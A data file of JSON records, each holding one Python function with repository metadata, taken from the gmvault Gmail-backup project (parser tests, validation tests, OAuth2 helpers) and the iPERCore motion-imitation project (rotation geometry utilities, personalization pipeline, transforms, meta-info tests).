{"docstring": "\"\"\"\n   main test function\n\"\"\"\n", "func_signal": "def tests():\n", "code": "suite = unittest.TestLoader().loadTestsFromTestCase(TestGMVaultValidation)\nunittest.TextTestRunner(verbosity=2).run(suite)", "path": "gmvault/src/gmv/validation_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"Generates an IMAP OAuth2 authentication string.\n\nSee https://developers.google.com/google-apps/gmail/oauth2_overview\n\nArgs:\n  username: the username (email address) of the account to authenticate\n  access_token: An OAuth2 access token.\n  base64_encode: Whether to base64-encode the output.\n\nReturns:\n  The SASL argument for the OAuth2 mechanism.\n\"\"\"\n", "func_signal": "def GenerateOAuth2String(username, access_token, base64_encode=True):\n", "code": "auth_string = 'user=%s\\1auth=Bearer %s\\1\\1' % (username, access_token)\nif base64_encode:\n  auth_string = base64.b64encode(auth_string)\nreturn auth_string", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" multiple lists within lists \"\"\"\n\n", "func_signal": "def test_imbricated_lists_test(self):\n", "code": "the_string = \"[a,b, [1,2,3,4, [456,6,'absdef'], 234, 2.456 ], aqwe, done]\"\n        \ncompiler = Compiler()\n\nthe_result = compiler.compile_list(the_string)\n\nself.assertEqual(the_result, ['a', 'b', [1, 2, 3, 4, [456, 6, 'absdef'], 234, 2.456 ]\\\n                              , 'aqwe', 'done'])", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"\n   spawn python gmv_runner account > help_msg_spawned.txt\n   check that res is 0 or 1\n\"\"\"\n", "func_signal": "def test_help_msg_spawned_by_def(self):\n", "code": "credential  = { 'type' : 'passwd', 'value': self.test_passwd}\ntest_db_dir = \"/tmp/gmvault-tests\"\n\nrestorer = gmvault.GMVaulter(test_db_dir, 'imap.gmail.com', 993, self.test_login, credential, \\\n                             read_only_access = False)\n\nrestorer.restore() #restore all emails from this essential-db\n\n#need to check that all labels are there for emails in essential\ngmail_ids = restorer.gstorer.get_all_existing_gmail_ids()\n\nfor gm_id in gmail_ids:\n    #get disk_metadata\n    disk_metadata   = restorer.gstorer.unbury_metadata(gm_id)\n    \n    # get online_metadata \n    online_metadata = restorer.src.fetch(gm_id, imap_utils.GIMAPFetcher.GET_ALL_BUT_DATA) \n    \n    #compare metadata\n    for key in disk_metadata:\n        self.assertEquals(disk_metadata[key], online_metadata[key])", "path": "gmvault/src/gmv/validation_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" list with dict \"\"\"\n\n", "func_signal": "def test_list_with_dict(self):\n", "code": "the_string = \"['a',1,'b',{2:3,4:5} ]\"\n        \ncompiler = Compiler()\n\nthe_result = compiler.compile_list(the_string)\n\nself.assertEqual(the_result, ['a', 1, 'b', { 2 : 3 , 4 : 5} ])", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" Global test method \"\"\"\n#suite = unittest.TestLoader().loadTestsFromModule(struct_parser)\n", "func_signal": "def tests():\n", "code": "suite = unittest.TestLoader().loadTestsFromTestCase(TestParser)\nunittest.TextTestRunner(verbosity=2).run(suite)", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" no quotes dict \"\"\"\n\n", "func_signal": "def test_noquotes_dict(self):\n", "code": "the_string = \"{ no12: a b , no10:a}\"\n        \ncompiler = Compiler()\n\nthe_result = compiler.compile_dict(the_string)\n\nself.assertEqual(the_result, { 'no12': 'a b' , 'no10':'a'})", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"Authenticates to SMTP with the given auth_string.\n\nArgs:\n  user: The Gmail username (full email address)\n  auth_string: A valid OAuth2 string, not base64-encoded, as returned by\n      GenerateOAuth2String.\n\"\"\"\n", "func_signal": "def TestSmtpAuthentication(user, auth_string):\n", "code": "print\nsmtp_conn = smtplib.SMTP('smtp.gmail.com', 587)\nsmtp_conn.set_debuglevel(True)\nsmtp_conn.ehlo('test')\nsmtp_conn.starttls()\nsmtp_conn.docmd('AUTH', 'XOAUTH2 ' + base64.b64encode(auth_string))", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" a negative number test \"\"\"\n", "func_signal": "def test_negative_number_test(self):\n", "code": "the_string = \"         [ '-10.4',     1.435, 3 ]\"\n\ncompiler = Compiler()\n\nthe_result = compiler.compile_list(the_string)\n\nself.assertEqual(the_result, [ '-10.4', 1.435, 3])", "path": "gmvault/src/gmv/conf/utils/struct_parser_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"Obtains OAuth access token and refresh token.\n\nThis uses the application portion of the \"OAuth2 for Installed Applications\"\nflow at https://developers.google.com/accounts/docs/OAuth2InstalledApp#handlingtheresponse\n\nArgs:\n  client_id: Client ID obtained by registering your app.\n  client_secret: Client secret obtained by registering your app.\n  authorization_code: code generated by Google Accounts after user grants\n      permission.\nReturns:\n  The decoded response from the Google Accounts server, as a dict. Expected\n  fields include 'access_token', 'expires_in', and 'refresh_token'.\n\"\"\"\n", "func_signal": "def AuthorizeTokens(client_id, client_secret, authorization_code):\n", "code": "params = {}\nparams['client_id'] = client_id\nparams['client_secret'] = client_secret\nparams['code'] = authorization_code\nparams['redirect_uri'] = REDIRECT_URI\nparams['grant_type'] = 'authorization_code'\nrequest_url = AccountsUrl('o/oauth2/token')\n\nresponse = urllib.urlopen(request_url, urllib.urlencode(params)).read()\nreturn json.loads(response)", "path": "gmvault/src/sandbox/oauth2.py", "commit_date": "2015-04-01 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\" constructor \"\"\"\n", "func_signal": "def __init__(self, stuff):\n", "code": "super(TestGMVaultValidation, self).__init__(stuff)\n\nself.test_login  = None\nself.test_passwd = None \n\nself.default_dir = \"/tmp/gmvault-tests\"", "path": "gmvault/src/gmv/validation_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"\n   Read log:pass from a file in my home\n\"\"\"\n", "func_signal": "def read_password_file(a_path):\n", "code": "with open(a_path) as f:\n    line = f.readline()\nlogin, passwd = line.split(\":\")\n\nreturn deobfuscate_string(login.strip()), deobfuscate_string(passwd.strip())", "path": "gmvault/src/gmv/validation_tests.py", "commit_date": "2015-04-16 00:00:00", "repo_name": "gaubert/gmvault", "stars": 3544, "license": "agpl-3.0", "language": "python", "size": 7197}
{"docstring": "\"\"\"\n\nArgs:\n    opt:\n\nReturns:\n\n\"\"\"\n\n", "func_signal": "def personalize(opt):\n", "code": "print(\"Step 2: running personalization on\")\n\npersonalized_ckpt_path = opt.meta_data.personalized_ckpt_path\n\nif not os.path.exists(personalized_ckpt_path):\n    personalizer = PersonalizerProcess(opt)\n    personalizer.start()\n    personalizer.join()\n\nprint(f\"Step 2: personalization done, saved in {personalized_ckpt_path}...\")", "path": "iPERCore/iPERCore/services/personalization.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "# 1. prepreocess\n", "func_signal": "def run_imitator(opt):\n", "code": "successful = preprocess(opt)\n\nif successful:\n    # 2. personalization\n    personalize(opt)\n    # 3. imitate\n    all_meta_outputs = imitate(opt)\nelse:\n    all_meta_outputs = []\n\nreturn all_meta_outputs", "path": "iPERCore/iPERCore/services/run_imitator.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "# cudnn related setting\n", "func_signal": "def set_cudnn():\n", "code": "cudnn.benchmark = True\n# cudnn.deterministic = False\ncudnn.deterministic = True\ncudnn.enabled = True", "path": "iPERCore/iPERCore/services/personalization.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Convert 6D rotation representation to 3x3 rotation matrix.\nBased on Zhou et al., \"On the Continuity of Rotation Representations in Neural Networks\", CVPR 2019\nInput:\n    (B,3,3) Batch of 6-D rotation representations\nOutput:\n    (B,6) Batch of corresponding rotation matrices\n\"\"\"\n\n", "func_signal": "def rotmat_to_rot6d(rotmat):\n", "code": "rot6d = rotmat[:, :, 0:2]\nrot6d = rot6d.reshape(-1, 6)\n\nreturn rot6d", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Convert quaternion coefficients to rotation matrix.\nArgs:\n    quat: size = [B, 4] 4 <===>(w, x, y, z)\nReturns:\n    Rotation matrix corresponding to the quaternion -- size = [B, 3, 3]\n\"\"\"\n", "func_signal": "def quat_to_rotmat(quat):\n", "code": "norm_quat = quat\nnorm_quat = norm_quat / norm_quat.norm(p=2, dim=1, keepdim=True)\nw, x, y, z = norm_quat[:, 0], norm_quat[:, 1], norm_quat[:, 2], norm_quat[:, 3]\n\nB = quat.size(0)\n\nw2, x2, y2, z2 = w.pow(2), x.pow(2), y.pow(2), z.pow(2)\nwx, wy, wz = w * x, w * y, w * z\nxy, xz, yz = x * y, x * z, y * z\n\nrotMat = torch.stack([w2 + x2 - y2 - z2, 2 * xy - 2 * wz, 2 * wy + 2 * xz,\n                      2 * wz + 2 * xy, w2 - x2 + y2 - z2, 2 * yz - 2 * wx,\n                      2 * xz - 2 * wy, 2 * wx + 2 * yz, w2 - x2 - y2 + z2], dim=1).view(B, 3, 3)\nreturn rotMat", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\n\nArgs:\n    rotvec (torch.Tensor): (n, 3)\n\nReturns:\n    rot6d (torch.Tensor): (n, 6)\n\"\"\"\n\n", "func_signal": "def rotvec_to_rot6d(rotvec):\n", "code": "rotmat = rotvec_to_rotmat(rotvec)\nrot6d = rotmat_to_rot6d(rotmat)\n\nreturn rot6d", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Find camera translation that brings 3D joints S closest to 2D the corresponding joints_2d.\nInput:\n    S: (B, 49, 3) 3D joint locations\n    joints: (B, 49, 3) 2D joint locations and confidence\nReturns:\n    (B, 3) camera translation vectors\n\"\"\"\n\n", "func_signal": "def estimate_translation(S, joints_2d, focal_length=5000., img_size=224.):\n", "code": "device = S.device\n# Use only joints 25:49 (GT joints)\nS = S[:, 25:, :].cpu().numpy()\njoints_2d = joints_2d[:, 25:, :].cpu().numpy()\njoints_conf = joints_2d[:, :, -1]\njoints_2d = joints_2d[:, :, :-1]\ntrans = np.zeros((S.shape[0], 3), dtype=np.float32)\n# Find the translation for each example in the batch\nfor i in range(S.shape[0]):\n    S_i = S[i]\n    joints_i = joints_2d[i]\n    conf_i = joints_conf[i]\n    trans[i] = estimate_translation_np(S_i, joints_i, conf_i, focal_length=focal_length, img_size=img_size)\nreturn torch.from_numpy(trans).to(device)", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "# image = F.to_tensor(image)\n", "func_signal": "def __call__(self, image):\n", "code": "image = TF.to_tensor(image)\nimage.mul_(2.0)\nimage.sub_(1.0)\nreturn image", "path": "iPERCore/iPERCore/data/transforms.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\n\nArgs:\n    rotmat (torch.Tensor): (n, 3, 3)\n\nReturns:\n    rotvec (torch.Tensor): (n, 3)\n\"\"\"\n\n", "func_signal": "def rotmat_to_rotvec(rotmat):\n", "code": "bs = rotmat.shape[0]\n\npad_hom = torch.tensor([0, 0, 1], dtype=torch.float32, device=rotmat.device).view(1, 3, 1).expand(bs, -1, -1)\npred_rotmat_hom = torch.cat([rotmat, pad_hom], dim=-1)\nrotvec = rotation_matrix_to_angle_axis(pred_rotmat_hom).contiguous().view(bs, -1)\nrotvec[torch.isnan(rotvec)] = 0.0\n\nreturn rotvec", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\n\nArgs:\n    opt:\n\"\"\"\n\n# 1. setup the seed of numpy\n", "func_signal": "def __init__(self, opt):\n", "code": "np.random.seed(2020)\n\n# 2. set gpu devices\ngpus = opt.gpu_ids\ndevice = torch.device(\"cuda:{}\".format(opt.local_rank))\n\n# 3. prepare dataset and dataloader\ntrain_dataset = PersonalizedDataset(opt, opt.meta_data.meta_src)\n\ntrainloader = DataLoader(\n    train_dataset,\n    batch_size=opt.batch_size,\n    shuffle=not opt.serial_batches,\n    num_workers=1,\n    pin_memory=True,\n    drop_last=True,\n    worker_init_fn=worker_init_fn\n)\n\nself._opt = opt\nself._num_gpus = len(gpus)\nself._device = device\nself._model = None   # this will be initialized in self.run()\nself._num_videos = train_dataset.num_videos\nself._train_size = len(train_dataset)\nself._trainloader = trainloader\nself._iters_per_epoch = len(self._trainloader)\nself._last_print_time = None\nself._last_display_time = None\n\nif opt.tb_visual:\n    self._tb_visualizer = TBVisualizer(opt)\nelse:\n    self._tb_visualizer = None\n\nprint(f\"#train video clips = {train_dataset.size()}\")\n\nsuper().__init__(name=f\"Personalizer_{opt.gpu_ids}\")", "path": "iPERCore/iPERCore/services/personalization.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\n\nArgs:\n    rot6d (torch.Tensor): (n, 6)\nReturns:\n    rotvec (torch.Tensor): (n, 3)\n\"\"\"\n\n", "func_signal": "def rot6d_to_rotvec(rot6d):\n", "code": "rotmat = rot6d_to_rotmat(rot6d)\nrotvec = rotmat_to_rotvec(rotmat)\nreturn rotvec", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Convert 3d vector of axis-angle rotation to 4x4 rotation matrix\n\nArgs:\n    angle_axis (Tensor): tensor of 3d vector of axis-angle rotations.\n\nReturns:\n    Tensor: tensor of 4x4 rotation matrices.\n\nShape:\n    - Input: :math:`(N, 3)`\n    - Output: :math:`(N, 4, 4)`\n\nExample:\n    >>> input = torch.rand(1, 3)  # Nx3\n    >>> output = tgm.angle_axis_to_rotation_matrix(input)  # Nx4x4\n\"\"\"\n", "func_signal": "def angle_axis_to_rotation_matrix(angle_axis):\n", "code": "def _compute_rotation_matrix(angle_axis, theta2, eps=1e-6):\n    # We want to be careful to only evaluate the square root if the\n    # norm of the angle_axis vector is greater than zero. Otherwise\n    # we get a division by zero.\n    k_one = 1.0\n    theta = torch.sqrt(theta2)\n    wxyz = angle_axis / (theta + eps)\n    wx, wy, wz = torch.chunk(wxyz, 3, dim=1)\n    cos_theta = torch.cos(theta)\n    sin_theta = torch.sin(theta)\n\n    r00 = cos_theta + wx * wx * (k_one - cos_theta)\n    r10 = wz * sin_theta + wx * wy * (k_one - cos_theta)\n    r20 = -wy * sin_theta + wx * wz * (k_one - cos_theta)\n    r01 = wx * wy * (k_one - cos_theta) - wz * sin_theta\n    r11 = cos_theta + wy * wy * (k_one - cos_theta)\n    r21 = wx * sin_theta + wy * wz * (k_one - cos_theta)\n    r02 = wy * sin_theta + wx * wz * (k_one - cos_theta)\n    r12 = -wx * sin_theta + wy * wz * (k_one - cos_theta)\n    r22 = cos_theta + wz * wz * (k_one - cos_theta)\n    rotation_matrix = torch.cat(\n        [r00, r01, r02, r10, r11, r12, r20, r21, r22], dim=1)\n    return rotation_matrix.view(-1, 3, 3)\n\ndef _compute_rotation_matrix_taylor(angle_axis):\n    rx, ry, rz = torch.chunk(angle_axis, 3, dim=1)\n    k_one = torch.ones_like(rx)\n    rotation_matrix = torch.cat(\n        [k_one, -rz, ry, rz, k_one, -rx, -ry, rx, k_one], dim=1)\n    return rotation_matrix.view(-1, 3, 3)\n\n# stolen from ceres/rotation.h\n\n_angle_axis = torch.unsqueeze(angle_axis, dim=1)\ntheta2 = torch.matmul(_angle_axis, _angle_axis.transpose(1, 2))\ntheta2 = torch.squeeze(theta2, dim=1)\n\n# compute rotation matrices\nrotation_matrix_normal = _compute_rotation_matrix(angle_axis, theta2)\nrotation_matrix_taylor = _compute_rotation_matrix_taylor(angle_axis)\n\n# create mask to handle both cases\neps = 1e-6\nmask = (theta2 > eps).view(-1, 1, 1).to(theta2.device)\nmask_pos = (mask).type_as(theta2)\nmask_neg = (mask == False).type_as(theta2)  # noqa\n\n# create output pose matrix\nbatch_size = angle_axis.shape[0]\nrotation_matrix = torch.eye(4).to(angle_axis.device).type_as(angle_axis)\nrotation_matrix = rotation_matrix.view(1, 4, 4).repeat(batch_size, 1, 1)\n# fill output matrix with masked values\nrotation_matrix[..., :3, :3] = \\\n    mask_pos * rotation_matrix_normal + mask_neg * rotation_matrix_taylor\nreturn rotation_matrix  # Nx4x4", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\n\n    ref_input = \"/path1\"\n\nReturns:\n\n\"\"\"\n\n", "func_signal": "def test_05_parse_ref_missing_value(self):\n", "code": "ref_input = \"path?=/path1,audio?=/audio1,pose_fc?=|\" \\\n            \"path?=/path2,audio?=/audio2,pose_fc?=\"\n\nref_meta_gt = [\n    meta_info.RefMetaInputInfo(path=\"/path1\", name=\"path1\", audio=\"/audio1\"),\n    meta_info.RefMetaInputInfo(path=\"/path2\", name=\"path2\", audio=\"/audio2\")\n]\n\nref_meta_parse = meta_info.parse_ref_input(ref_input)\n\nfor meta_gt, meta_parse in zip(ref_meta_gt, ref_meta_parse):\n    # print(meta_gt)\n    # print(meta_parse)\n\n    self.assertEqual(meta_gt == meta_parse, True)", "path": "iPERCore/tests/test_services/test_metainfo.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Find camera translation that brings 3D joints S closest to 2D the corresponding joints_2d.\nInput:\n    S: (25, 3) 3D joint locations\n    joints: (25, 3) 2D joint locations and confidence\nReturns:\n    (3,) camera translation vector\n\"\"\"\n\n", "func_signal": "def estimate_translation_np(S, joints_2d, joints_conf, focal_length=5000, img_size=224):\n", "code": "num_joints = S.shape[0]\n# focal length\nf = np.array([focal_length, focal_length])\n# optical center\ncenter = np.array([img_size / 2., img_size / 2.])\n\n# transformations\nZ = np.reshape(np.tile(S[:, 2], (2, 1)).T, -1)\nXY = np.reshape(S[:, 0:2], -1)\nO = np.tile(center, num_joints)\nF = np.tile(f, num_joints)\nweight2 = np.reshape(np.tile(np.sqrt(joints_conf), (2, 1)).T, -1)\n\n# least squares\nQ = np.array([F * np.tile(np.array([1, 0]), num_joints), F * np.tile(np.array([0, 1]), num_joints),\n              O - np.reshape(joints_2d, -1)]).T\nc = (np.reshape(joints_2d, -1) - O) * Z - F * XY\n\n# weighted least squares\nW = np.diagflat(weight2)\nQ = np.dot(W, Q)\nc = np.dot(W, c)\n\n# square matrix\nA = np.dot(Q.T, Q)\nb = np.dot(Q.T, c)\n\n# solution\ntrans = np.linalg.solve(A, b)\n\nreturn trans", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\nArgs:\n    output_size (tuple or int): Desired output size. If tuple, output is matched to output_size.\n                    If int, smaller of image edges is matched to output_size keeping aspect ratio the same.\n\"\"\"\n", "func_signal": "def __init__(self, output_size):\n", "code": "assert isinstance(output_size, (int, tuple))\nself.output_size = output_size", "path": "iPERCore/iPERCore/data/transforms.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Convert 3x4 rotation matrix to 4d quaternion vector\n\nThis algorithm is based on algorithm described in\nhttps://github.com/KieranWynn/pyquaternion/blob/master/pyquaternion/quaternion.py#L201\n\nArgs:\n    rotation_matrix (Tensor): the rotation matrix to convert.\n\nReturn:\n    Tensor: the rotation in quaternion\n\nShape:\n    - Input: :math:`(N, 3, 4)`\n    - Output: :math:`(N, 4)`\n\nExample:\n    >>> input = torch.rand(4, 3, 4)  # Nx3x4\n    >>> output = tgm.rotation_matrix_to_quaternion(input)  # Nx4\n\"\"\"\n", "func_signal": "def rotation_matrix_to_quaternion(rotation_matrix, eps=1e-6):\n", "code": "if not torch.is_tensor(rotation_matrix):\n    raise TypeError(\"Input type is not a torch.Tensor. Got {}\".format(\n        type(rotation_matrix)))\n\nif len(rotation_matrix.shape) > 3:\n    raise ValueError(\n        \"Input size must be a three dimensional tensor. Got {}\".format(\n            rotation_matrix.shape))\nif not rotation_matrix.shape[-2:] == (3, 4):\n    raise ValueError(\n        \"Input size must be a N x 3 x 4  tensor. Got {}\".format(\n            rotation_matrix.shape))\n\nrmat_t = torch.transpose(rotation_matrix, 1, 2)\n\nmask_d2 = (rmat_t[:, 2, 2] < eps).float()\n\nmask_d0_d1 = (rmat_t[:, 0, 0] > rmat_t[:, 1, 1]).float()\nmask_d0_nd1 = (rmat_t[:, 0, 0] < -rmat_t[:, 1, 1]).float()\n\nt0 = 1 + rmat_t[:, 0, 0] - rmat_t[:, 1, 1] - rmat_t[:, 2, 2]\nq0 = torch.stack([rmat_t[:, 1, 2] - rmat_t[:, 2, 1],\n                  t0, rmat_t[:, 0, 1] + rmat_t[:, 1, 0],\n                  rmat_t[:, 2, 0] + rmat_t[:, 0, 2]], -1)\nt0_rep = t0.repeat(4, 1).t()\n\nt1 = 1 - rmat_t[:, 0, 0] + rmat_t[:, 1, 1] - rmat_t[:, 2, 2]\nq1 = torch.stack([rmat_t[:, 2, 0] - rmat_t[:, 0, 2],\n                  rmat_t[:, 0, 1] + rmat_t[:, 1, 0],\n                  t1, rmat_t[:, 1, 2] + rmat_t[:, 2, 1]], -1)\nt1_rep = t1.repeat(4, 1).t()\n\nt2 = 1 - rmat_t[:, 0, 0] - rmat_t[:, 1, 1] + rmat_t[:, 2, 2]\nq2 = torch.stack([rmat_t[:, 0, 1] - rmat_t[:, 1, 0],\n                  rmat_t[:, 2, 0] + rmat_t[:, 0, 2],\n                  rmat_t[:, 1, 2] + rmat_t[:, 2, 1], t2], -1)\nt2_rep = t2.repeat(4, 1).t()\n\nt3 = 1 + rmat_t[:, 0, 0] + rmat_t[:, 1, 1] + rmat_t[:, 2, 2]\nq3 = torch.stack([t3, rmat_t[:, 1, 2] - rmat_t[:, 2, 1],\n                  rmat_t[:, 2, 0] - rmat_t[:, 0, 2],\n                  rmat_t[:, 0, 1] - rmat_t[:, 1, 0]], -1)\nt3_rep = t3.repeat(4, 1).t()\n\nmask_c0 = mask_d2 * mask_d0_d1\nmask_c1 = mask_d2 * (1 - mask_d0_d1)\nmask_c2 = (1 - mask_d2) * mask_d0_nd1\nmask_c3 = (1 - mask_d2) * (1 - mask_d0_nd1)\nmask_c0 = mask_c0.view(-1, 1).type_as(q0)\nmask_c1 = mask_c1.view(-1, 1).type_as(q1)\nmask_c2 = mask_c2.view(-1, 1).type_as(q2)\nmask_c3 = mask_c3.view(-1, 1).type_as(q3)\n\nq = q0 * mask_c0 + q1 * mask_c1 + q2 * mask_c2 + q3 * mask_c3\nq /= torch.sqrt(t0_rep * mask_c0 + t1_rep * mask_c1 +  # noqa\n                t2_rep * mask_c2 + t3_rep * mask_c3)  # noqa\nq *= 0.5\nreturn q", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\ntest the full ref_input case.\n\nReturns:\n\n\"\"\"\n\n", "func_signal": "def test_01_parse_ref_full(self):\n", "code": "ref_input = \"path?=/path1,name?=name1,audio?=/audio1,fps?=30,pose_fc?=300,cam_fc?=100|\" \\\n            \"path?=/path2,name?=name2,audio?=/audio2,fps?=25,pose_fc?=200,cam_fc?=50\"\n\nref_meta_gt = [\n    meta_info.RefMetaInputInfo(path=\"/path1\", name=\"name1\", audio=\"/audio1\", fps=30, pose_fc=300, cam_fc=100),\n    meta_info.RefMetaInputInfo(path=\"/path2\", name=\"name2\", audio=\"/audio2\", fps=25, pose_fc=200, cam_fc=50)\n]\n\nref_meta_parse = meta_info.parse_ref_input(ref_input)\n\nfor meta_gt, meta_parse in zip(ref_meta_gt, ref_meta_parse):\n    # print(meta_gt)\n    # print(meta_parse)\n\n    self.assertEqual(meta_gt == meta_parse, True)", "path": "iPERCore/tests/test_services/test_metainfo.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Convert 6D rotation representation to 3x3 rotation matrix.\nBased on Zhou et al., \"On the Continuity of Rotation Representations in Neural Networks\", CVPR 2019\nInput:\n    (B,6) Batch of 6-D rotation representations\nOutput:\n    (B,3,3) Batch of corresponding rotation matrices\n\"\"\"\n", "func_signal": "def rot6d_to_rotmat(x):\n", "code": "x = x.view(-1, 3, 2)\na1 = x[:, :, 0]\na2 = x[:, :, 1]\nb1 = F.normalize(a1)\nb2 = F.normalize(a2 - torch.einsum('bi,bi->b', b1, a2).unsqueeze(-1) * b1)\nb3 = torch.cross(b1, b2)\nreturn torch.stack((b1, b2, b3), dim=-1)", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"\n\n    ref_input = \"/path1\"\n\nReturns:\n\n\"\"\"\n\n", "func_signal": "def test_04_parse_ref_missing_key_value(self):\n", "code": "ref_input = \"path?=/path1,audio?=/audio1,pose_fc?=300|\" \\\n            \"path?=/path2,audio?=/audio2,pose_fc?=200\"\n\nref_meta_gt = [\n    meta_info.RefMetaInputInfo(path=\"/path1\", name=\"path1\", audio=\"/audio1\", pose_fc=300),\n    meta_info.RefMetaInputInfo(path=\"/path2\", name=\"path2\", audio=\"/audio2\", pose_fc=200)\n]\n\nref_meta_parse = meta_info.parse_ref_input(ref_input)\n\nfor meta_gt, meta_parse in zip(ref_meta_gt, ref_meta_parse):\n    # print(meta_gt)\n    # print(meta_parse)\n\n    self.assertEqual(meta_gt == meta_parse, True)", "path": "iPERCore/tests/test_services/test_metainfo.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
{"docstring": "\"\"\"Convert axis-angle representation to rotation matrix.\nArgs:\n    rot_vecs: size = [B, 3]\nReturns:\n    Rotation matrix corresponding to the quaternion -- size = [B, 3, 3]\n\"\"\"\n", "func_signal": "def rotvec_to_rotmat(rot_vecs):\n", "code": "l1norm = torch.norm(rot_vecs + 1e-8, p=2, dim=1)\nangle = torch.unsqueeze(l1norm, -1)\nnormalized = torch.div(rot_vecs, angle)\nangle = angle * 0.5\nv_cos = torch.cos(angle)\nv_sin = torch.sin(angle)\nquat = torch.cat([v_cos, v_sin * normalized], dim=1)\nreturn quat_to_rotmat(quat)", "path": "iPERCore/iPERCore/tools/utils/geometry/rotations.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "iPERDance/iPERCore", "stars": 2426, "license": "apache-2.0", "language": "python", "size": 23570}
